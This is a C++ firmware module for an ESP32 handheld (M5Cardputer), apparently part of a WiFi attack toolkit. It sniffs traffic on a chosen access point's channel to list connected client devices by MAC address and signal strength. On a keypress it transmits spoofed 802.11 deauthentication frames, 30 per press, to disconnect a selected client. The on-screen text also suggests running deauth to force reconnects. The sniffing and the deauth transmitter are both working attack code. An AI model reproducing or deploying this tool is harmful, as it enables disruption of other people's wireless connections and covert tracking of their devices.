/*
 * wifi_clients — list STA clients connected to a target AP.
 *
 * Locks channel to the target AP, listens for data frames going to or
 * from that BSSID, extracts the STA MAC(s). Shows a live table of
 * seen clients with last-seen timestamp and RSSI.
 *
 * Press D on a highlighted client to deauth just that one (unicast
 * deauth to the client MAC spoofed-from the AP).
 */
#include "app.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "wifi_types.h"
#include <WiFi.h>
#include <esp_wifi.h>

#define MAX_CLIENTS 16

struct cli_t {
    uint8_t  mac[6];
    int8_t   rssi;
    uint32_t last_seen;
    uint32_t frames;
};

static cli_t    s_clients[MAX_CLIENTS];
static volatile int s_count = 0;
static uint8_t  s_target[6];
static uint8_t  s_target_ch = 1;

/* Capture data frames going to/from our target BSSID, extract the
 * "other" MAC (the STA). */
static void client_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    if (pkt->rx_ctrl.sig_len < 24) return;

    uint8_t fc = p[1];
    uint8_t from_ds = (fc >> 1) & 1;
    uint8_t to_ds   = (fc)      & 1;

    const uint8_t *bssid;
    const uint8_t *sta;
    if (to_ds && !from_ds) {        /* STA → AP: addr1=BSSID, addr2=STA */
        bssid = p + 4;  sta = p + 10;
    } else if (from_ds && !to_ds) { /* AP → STA: addr1=STA, addr2=BSSID */
        bssid = p + 10; sta = p + 4;
    } else {
        return;
    }

    if (memcmp(bssid, s_target, 6) != 0) return;

    int idx = -1;
    for (int i = 0; i < s_count; ++i) {
        if (memcmp(s_clients[i].mac, sta, 6) == 0) { idx = i; break; }
    }
    if (idx < 0) {
        if (s_count >= MAX_CLIENTS) return;
        idx = s_count++;
        memcpy(s_clients[idx].mac, sta, 6);
        s_clients[idx].frames = 0;
    }
    s_clients[idx].rssi      = pkt->rx_ctrl.rssi;
    s_clients[idx].last_seen = millis();
    s_clients[idx].frames++;
}

/* Targeted deauth: AP → STA (client), spoofed sender = AP. */
static void deauth_client(const uint8_t *client)
{
    uint8_t frame[26] = {
        0xC0, 0x00, 0x00, 0x00,
        client[0], client[1], client[2], client[3], client[4], client[5],
        s_target[0], s_target[1], s_target[2], s_target[3], s_target[4], s_target[5],
        s_target[0], s_target[1], s_target[2], s_target[3], s_target[4], s_target[5],
        0x00, 0x00,
        0x07, 0x00,
    };
    for (int i = 0; i < 30; ++i) {
        esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
        delay(5);
    }
}

void feat_wifi_clients(void)
{
    radio_switch(RADIO_WIFI);
    WiFi.mode(WIFI_STA);

    if (!g_last_selected_valid) {
        ui_toast("scan + select AP first", COL_WARN, 1500);
        return;
    }
    memcpy(s_target, g_last_selected_ap.bssid, 6);
    s_target_ch = g_last_selected_ap.channel ? g_last_selected_ap.channel : 1;

    s_count = 0;
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(client_cb);
    esp_wifi_set_channel(s_target_ch, WIFI_SECOND_CHAN_NONE);

    int cursor = 0;
    ui_draw_footer(";/.=move  D=deauth one  `=back");
    uint32_t last = 0;
    while (true) {
        if (millis() - last > 300) {
            last = millis();
            auto &d = M5Cardputer.Display;
            ui_clear_body();
            d.setTextColor(COL_ACCENT, COL_BG);
            d.setCursor(4, BODY_Y + 2);
            d.printf("CLIENTS  %d  ch%u", s_count, s_target_ch);
            d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, COL_ACCENT);

            d.setTextColor(COL_DIM, COL_BG);
            d.setCursor(4, BODY_Y + 14);
            d.printf("%.24s", g_last_selected_ap.ssid);

            if (s_count == 0) {
                d.setTextColor(COL_DIM, COL_BG);
                d.setCursor(4, BODY_Y + 34);
                d.print("no traffic yet. waiting...");
                d.setCursor(4, BODY_Y + 46);
                d.print("try running deauth to");
                d.setCursor(4, BODY_Y + 58);
                d.print("force reconnects.");
            } else {
                int rows = 7;
                if (cursor < 0) cursor = 0;
                if (cursor >= s_count) cursor = s_count - 1;
                int first = cursor - rows / 2;
                if (first < 0) first = 0;
                if (first + rows > s_count) first = max(0, s_count - rows);

                for (int r = 0; r < rows && first + r < s_count; ++r) {
                    const cli_t &c = s_clients[first + r];
                    int y = BODY_Y + 28 + r * 11;
                    bool sel = (first + r == cursor);
                    if (sel) d.fillRect(0, y - 1, SCR_W, 11, 0x18C7);
                    d.setTextColor(sel ? COL_ACCENT : COL_FG, sel ? 0x18C7 : COL_BG);
                    d.setCursor(4, y);
                    d.printf("%02X:%02X:%02X:%02X:%02X:%02X",
                             c.mac[0], c.mac[1], c.mac[2],
                             c.mac[3], c.mac[4], c.mac[5]);
                    d.setTextColor(COL_DIM, sel ? 0x18C7 : COL_BG);
                    d.setCursor(138, y);
                    d.printf("%4d %lu", c.rssi, (unsigned long)c.frames);
                }
            }
            ui_draw_status(radio_name(), "clients");
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
        if (k == ';' || k == PK_UP)   { if (cursor > 0) cursor--; }
        if (k == '.' || k == PK_DOWN) { if (cursor + 1 < s_count) cursor++; }
        if ((k == 'd' || k == 'D') && s_count > 0 && cursor < s_count) {
            deauth_client(s_clients[cursor].mac);
            ui_toast("deauth sent", COL_BAD, 600);
        }
    }

    esp_wifi_set_promiscuous(false);
    g_last_selected_valid = false;
}
